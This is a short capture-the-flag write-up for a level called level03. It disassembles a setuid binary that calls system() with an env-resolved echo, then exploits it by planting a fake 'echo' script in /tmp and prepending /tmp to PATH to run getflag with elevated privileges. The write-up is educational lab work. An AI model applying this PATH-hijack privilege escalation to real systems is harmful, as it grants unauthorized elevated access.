Let's inspect home directory:
```
ls -la
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
```

We see a file owned by flag03.

It seems to be an executable.
Let's execute it.
It says: `Exploit me`.

Let's send it to host and inspect it with Hopper (a dissassembler).
Dissassmbled main function looks like this:
```
int main() {
    var_8 = getegid();
    var_4 = geteuid();
    setresgid(var_8, var_8, var_8);
    setresuid(var_4, var_4, var_4);
    eax = system("/usr/bin/env echo Exploit me");
    return eax;
}
```

Using `PATH` variable we can replace `echo` command.

We may call to `getflag` because `level03` has required permission.
Let's write a simple script, that writes result of `getflag` call:
```
echo $(getflag)
```

We can't create at home so, create it at `/tmp`:
```
cd /tmp
echo '/bin/getflag' > echo
chmod 777 echo
```

Now modify `PATH` variable:
```
export PATH=/tmp:$PATH
```

And execute `level03`. We get the token!


Resources:
https://failingsilently.wordpress.com/2017/09/08/exploiting-calls-to-system/